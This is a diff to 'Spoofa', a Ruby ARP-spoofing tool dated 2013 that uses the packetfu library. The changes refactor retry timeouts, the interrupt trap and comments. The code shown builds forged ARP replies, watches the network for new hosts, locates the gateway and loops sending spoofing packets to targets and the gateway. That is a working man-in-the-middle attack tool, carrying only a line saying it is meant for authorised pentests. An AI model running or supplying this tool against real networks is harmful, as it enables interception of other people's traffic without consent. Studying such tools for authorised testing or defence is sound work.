@@ -1,25 +1,22 @@
 #!/usr/bin/env ruby
 
-=begin
-
 # SPOOFA - for ARP-spoofing local networks #
 
-(C) 2013 VulpiArgenti (SilverFoxx)
+# (C) 2013 VulpiArgenti (SilverFoxx)
 
-This program is only for use during an authorised pentest, authorised 
-network maintenance, or for private research.
+# This program is only for use during an authorised pentest, authorised network 
+#   maintenance, or for private research.
 
-This program is free software: you can redistribute it and/or modify
-it under the terms of the GNU General Public License as published by
-the Free Software Foundation, either version 3 of the License, or
-(at your option) any later version.
-This program is distributed in the hope that it will be useful,
-but WITHOUT ANY WARRANTY; without even the implied warranty of
-MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-GNU General Public License for more details.
-You should have received a copy of the GNU General Public License
-along with this program.  If not, see <http://www.gnu.org/licenses/>.
-=end
+# This program is free software: you can redistribute it and/or modify it under 
+#   the terms of the GNU General Public License as published by the Free 
+#   Software Foundation, either version 3 of the License, or (at your option) 
+#   any later version.
+# This program is distributed in the hope that it will be useful, but WITHOUT 
+#   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or 
+#   FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for 
+#   more details.
+# You should have received a copy of the GNU General Public License along with 
+#   this program.  If not, see <http://www.gnu.org/licenses/>.
 
 require 'packetfu'
 require 'optparse'
@@ -62,8 +59,6 @@ else
         exit 0
       end
     end
-    
-    # Parse the command-line options
     optparse.parse! 
     raise OptionParser::MissingArgument if options.interface.nil? 
   rescue OptionParser::MissingArgument => e
@@ -76,6 +71,8 @@ end
 #----------------------------------------------------------------------#
 # Assorted methods
 
+trap("INT") { neat_exit }
+
 def ip_check(ip)
   true if ip =~ /^(192|10|172)((\.)(25[0-5]|2[0-4][0-9]|[1][0-9][0-9]|[1-9][0-9]|[0-9])){3}$/
 end
@@ -85,22 +82,20 @@ def puts_verbose(text)
 end
 
 def target_parse(target)
-  begin
-    target = target.split(",")
-    @target = []                                          # Array of target ip's
-    @target = target.select {|ip| ip_check(ip)}           # Move single ips to @target
-    target.delete_if {|ip| ip_check(ip)}                  # Leaving range(s) in target
-    target.each do |range|                                # Separate range(s) into start and end addresses
-      from  = range[/\A(\w*.){3}(\w*)/]     
-      to    = range[/\A(\w*.){3}/] + range.split("-")[1]  
-      ip_from   = IPAddr.new(from)
-      ip_to     = IPAddr.new(to)
-      (ip_from..ip_to).each { |ip| @target << ip.to_s }   # Enter each value of range into @target
-    end
-  rescue
-    puts "\n!!! Invalid target #{target} !!!"
-    neat_exit
+  target = target.split(",")
+  @target = []                                          # Array of target ip's
+  @target = target.select {|ip| ip_check(ip)}           # Move single ips to @target
+  target.delete_if {|ip| ip_check(ip)}                  # Leaving range(s) in target
+  target.each do |range|                                # Separate range(s) into start and end addresses
+    from  = range[/\A(\w*.){3}(\w*)/]     
+    to    = range[/\A(\w*.){3}/] + range.split("-")[1]  
+    ip_from   = IPAddr.new(from)
+    ip_to     = IPAddr.new(to)
+    (ip_from..ip_to).each { |ip| @target << ip.to_s }   # Enter each value of range into @target
   end
+rescue
+  puts "\n!!! Invalid target #{target} !!!"
+  neat_exit
 end
   
 def build_pkt(dest_mac, source_ip, dest_ip, source_mac = @defaults[:eth_saddr], op_code = 2)
@@ -168,7 +163,7 @@ def make_packet_array(target_hash)
   end
 end
 
-# continuously monitors network for new ARPs, then adds them to @new_targets.
+# Continuously monitors network for new ARPs, then adds them to @new_targets.
 def arp_monitor
   Thread.new do
     @arp_cap = PacketFu::Capture.new(:iface => @defaults[:iface], :filter => "arp and not ether src #{@defaults[:eth_saddr]}")
@@ -178,16 +173,17 @@ def arp_monitor
       ipaddr = arp_pkt.arp_saddr_ip
       if in_scope?(ipaddr) && ipaddr != @defaults[:ip_saddr] && !@targets_hash.include?(ipaddr) && ipaddr != @gateway
         if arp_pkt.arp_opcode == 1
-          macaddr = PacketFu::Utils::arp(ipaddr, :timeout => 3, :iface => @iface)
-          2.times do
-            macaddr = PacketFu::Utils::arp(ipaddr, :timeout => 5, :iface => @iface) unless macaddr
+          timeout = 2
+          3.times do
+            macaddr = PacketFu::Utils::arp(ipaddr, :timeout => timeout, :iface => @iface) unless macaddr
+            timeout += 2
           end
           @new_targets[ipaddr] = macaddr
           puts_verbose("\nNew target arrived; #{ipaddr} ")
         elsif arp_pkt.arp_opcode == 2
           @new_targets[ipaddr] = arp_pkt.arp_saddr_mac
-          puts_verbose("\nNew target arrived; #{ipaddr} ")
         end
+        puts_verbose("\nNew target arrived; #{ipaddr} ")
         make_packet_array(@new_targets) unless @new_targets.empty? # makes additional spoof packets for any new targets
       end
     end
@@ -225,8 +221,6 @@ end
 #----------------------------------------------------------------------#
 # Let's set some defaults and variables
 
-trap("INT") { neat_exit }
-
 if interactive
   puts "Spoofa: for ARP-spoofing networks\n(C) 2013 VulpiArgenti (SilverFoxx)\n"
   @verbose = true
@@ -241,7 +235,7 @@ if interactive
   end
 
   until ip_check(@gateway) do
-    net = (`netstat -nr`).split(/\n/).select {|n| n =~ /UG/ }  # Guess gateway by parsing netstat
+    net = (`netstat -nr`).split(/\n/).select {|n| n =~ /UG/ }  # Find gateway by parsing netstat
     @gateway = ((net[0]).split)[1] 
     if ip_check(@gateway)
     print "Gateway appears to be #{@gateway}.\nEnter to accept, or type an alternative IP: "
@@ -289,7 +283,7 @@ if interactive
   print "Enter target IP(s), separated by comma, or as a range. Enter blank to target entire subnet: "
   target = gets.chomp
 
-# CL mode 
+# Command-line mode 
 else  
   @verbose  = options.verbose
   @iface    = options.interface
@@ -301,7 +295,7 @@ else
   @two_way = true
   unless @gateway
     @two_way = false
-    net = (`netstat -nr`).split(/\n/).select {|n| n =~ /UG/ } # Guess gateway by parsing netstat
+    net = (`netstat -nr`).split(/\n/).select {|n| n =~ /UG/ } # Find gateway by parsing netstat
     @gateway = ((net[0]).split)[1]
   end 
   unless ip_check(@gateway)
@@ -323,20 +317,24 @@ if broadcast
 else
   var3 = target
 end 
-puts "\n#{Spoofing #{var3} on #{@iface}, #{var2}"
+puts "\n#Spoofing #{var3} on #{@iface}, #{var2}"
 
 #----------------------------------------------------------------------#
 # Run the script
 
 puts_verbose("\nLooking for gateway...")
-@gateway_mac = PacketFu::Utils::arp(@gateway, :timeout => 5, :iface => @iface)
-unless @gateway_mac 
-  (0..2).map { @gateway_mac = PacketFu::Utils::arp(@gateway, :timeout => 5, :iface => @iface) } # Try twice more, then exit.
+3.times do
+  timeout = 3
+  @gateway_mac = PacketFu::Utils::arp(@gateway, :timeout => timeout, :iface => @iface) unless @gateway_mac
+  timeout += 2
+end
+if @gateway_mac
+  puts_verbose "#{@gateway} \tmac is #{@gateway_mac} (Gateway)"
+else
   puts "Unable to determine gateway mac."
   sleep 2
   neat_exit
 end
-puts_verbose "#{@gateway} \tmac is #{@gateway_mac} (Gateway)"
 
 target_parse(target)
 target_scanner(@target, 4)
@@ -347,7 +345,7 @@ arp_monitor
 @send_packets = true
 while @send_packets
   print "\nSending spoofing packets to"
-  @targets_hash.each { |target, _| print ", #{target}" }
+  @targets_hash.each { |ip, _| print ", #{ip}" }
   print " and gateway #{@gateway}" if @two_way
   print "\nPackets sent: " if @verbose
   count = 0
